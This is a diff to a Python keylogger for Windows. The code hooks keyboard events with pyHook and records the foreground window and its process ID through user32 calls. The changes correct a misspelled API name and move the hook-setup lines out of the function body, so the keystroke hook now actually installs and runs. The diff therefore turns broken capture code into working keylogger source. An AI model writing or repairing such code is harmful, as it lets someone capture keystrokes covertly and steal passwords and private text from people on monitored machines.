@@ -10,10 +10,11 @@ current_window = None
 
 
 def get_current_process():
+
     hwnd = user32.GetForegroundWindow()
 
     pid = c_ulong(0)
-    user32.GetWindowThreadProcessID(hwnd, byref(pid))
+    user32.GetWindowThreadProcessId(hwnd, byref(pid))
 
     process_id = "%d" % pid.value
 
@@ -34,6 +35,7 @@ def get_current_process():
 
 
 def KeyStroke(event):
+
     global current_window
 
     if event.WindowName != current_window:
@@ -57,8 +59,8 @@ def KeyStroke(event):
 
     return True
 
-    kl = pyHook.HookManager()
-    kl.KeyDown = KeyStroke
+kl = pyHook.HookManager()
+kl.KeyDown = KeyStroke
 
-    kl.HookKeyboard()
-    pythoncom.PumpMessages()
+kl.HookKeyboard()
+pythoncom.PumpMessages()
